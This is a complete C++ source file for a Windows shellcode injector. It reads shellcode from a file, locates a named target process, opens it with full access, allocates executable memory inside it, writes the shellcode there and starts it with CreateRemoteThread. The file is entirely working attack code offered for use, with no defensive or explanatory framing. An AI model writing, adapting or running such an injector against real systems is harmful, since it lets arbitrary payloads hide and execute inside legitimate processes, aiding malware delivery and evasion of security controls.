#include <windows.h>
#include <sys/types.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string>
#include <fstream>
#include <sstream>


using namespace std;

DWORD FindProcessId(const std::wstring& processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}

	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processesSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	CloseHandle(processesSnapshot);
	return 0;
}


int main(int argc, char** argv) {

	if (argc < 3) {
		printf("Usage: %s <shellcode_file_path> <processToInject>", argv[0]);
		exit(1);
	}

	char * shellcodeFileName  = argv[1];
	string processToInject = string(argv[2]);
	LPVOID pointer_after_allocated;
	
	/* Reading shellcode file */
	stringstream strStream; ifstream inFile;
	inFile.open(shellcodeFileName); //open the input file
	strStream << inFile.rdbuf(); //read the file
	std::string buffer = strStream.str(); //str holds the content of the file
	size_t shellcodeLen = buffer.length();
	printf("[+]%d bytes of shellcode to inject\n", shellcodeLen);

	// Open process to Inject 
	std::wstring ws(processToInject.begin(), processToInject.end());
	DWORD pid = FindProcessId(ws);
	HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (process_handle == NULL)
	{
		puts("[-]Error while opening the process\n");
		exit(2);
	}
	puts("[+] Process Opened sucessfully\n");

	// Allocate memory in the remote process
	pointer_after_allocated = VirtualAllocEx(process_handle, NULL, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pointer_after_allocated == NULL) {
		puts("[-]Error while get the base address to write\n");
		
	}
	printf("[+]Got the address to write %p\n", pointer_after_allocated);

	// Writing process memory with our shellcode
	size_t writtenBytes;
	if (WriteProcessMemory(process_handle, (LPVOID)pointer_after_allocated, (LPCVOID)buffer.c_str(), shellcodeLen, &writtenBytes) && writtenBytes == shellcodeLen) {
		printf("[+]Shellcode correctly injected\nPress a key to run the shellcode as new thread !\n");
		getchar();
		CreateRemoteThread(process_handle, NULL, 100, (LPTHREAD_START_ROUTINE)pointer_after_allocated, NULL, NULL, (LPDWORD)0x50002);
	}
	else {
		puts("[-]Error while writing shellcode in memory\n");
	}

}